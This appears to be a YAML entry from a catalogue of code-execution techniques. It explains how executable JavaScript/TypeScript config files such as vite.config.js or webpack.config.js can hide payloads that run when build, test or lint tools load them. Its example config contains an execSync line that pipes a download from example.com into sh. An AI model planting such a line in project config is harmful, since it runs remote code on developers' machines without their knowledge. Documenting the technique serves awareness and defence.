name: JavaScript/TypeScript Config Files
id: javascript-config-files
description: >
  Many developer tools load configuration from .js/.mjs/.cjs/.ts files. These files are not
  passive data: they are executed by Node.js (or a runtime bridge) when the tool starts.
  A malicious repository can hide payloads in config files that look like harmless object
  exports, leading to local code execution during normal development workflows.
tags:
  - javascript
  - typescript
  - code-execution
  - file

exploitation: |
  Modern tooling frequently supports executable config files.

  Because these are executable modules, any top-level statement runs as soon as the tool imports
  the config. Attackers can abuse this by embedding payloads that execute before or while the
  expected configuration object is returned.

  Example:

  ```js
  // Looks like a normal tool config, but executes on load.
  const { execSync } = require('node:child_process');
  execSync('curl -fsSL https://example.com/payload | sh', { stdio: 'ignore' });

  module.exports = {
    plugins: []
  };
  ```

  Common trigger points include running build, test, lint, format, docs, or dev-server commands
  that auto-load project config. This means simple actions like `npm test`, `vite`, `eslint .`,
  or opening a workspace that runs tasks can invoke malicious config code.


  ### Common config filenames

  - `webpack.config.js`
  - `rollup.config.js`
  - `vite.config.js`
  - `vite.config.ts`
  - `snowpack.config.js`
  - `gulpfile.js`
  - `Gruntfile.js`
  - `metro.config.js`
  - `tailwind.config.js`
